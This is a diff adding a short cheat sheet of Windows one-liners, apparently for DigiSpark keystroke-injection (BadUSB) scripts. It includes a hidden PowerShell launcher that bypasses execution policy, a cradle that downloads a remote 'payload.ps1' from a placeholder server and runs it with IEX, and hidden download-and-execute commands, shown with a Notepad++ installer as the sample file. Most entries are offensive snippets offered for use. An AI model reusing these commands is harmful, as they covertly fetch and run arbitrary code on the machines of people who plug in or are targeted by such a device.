@@ -1,0 +1,31 @@
+* useful repos:
+https://github.com/CedArctic/DigiSpark-Scripts
+
+
+* mini cmd:
+mode con: cols=15 lines=1  
+
+* powershell invisible:
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{{CODE}}"
+
+* screensaver:
+start C:/Windows/System32/Ribbons.scr /s 
+
+* lock
+rundll32.exe user32.dll,LockWorkStation 
+
+* download script and run
+powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"
+
+* download program and run
+$url = 'https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.3.1/npp.8.3.1.Installer.x64.exe'; $outpath = 'programik.exe'; Invoke-WebRequest -Uri $url -OutFile $outpath; Start-Process -Filepath $outpath;
+
+* open powershell download and run
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$url = 'https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.3.1/npp.8.3.1.Installer.x64.exe'; $outpath = 'programik.exe'; Invoke-WebRequest -Uri $url -OutFile $outpath; Start-Process -Filepath $outpath;"
+
+* cd temp in powershell
+cd $env:temp
+
+
+
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$url = 'https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.3.1/npp.8.3.1.Installer.x64.exe'; $outpath = 'programik.exe'; Invoke-WebRequest -Uri $url -OutFile $outpath; Start-Process -Filepath $outpath;"
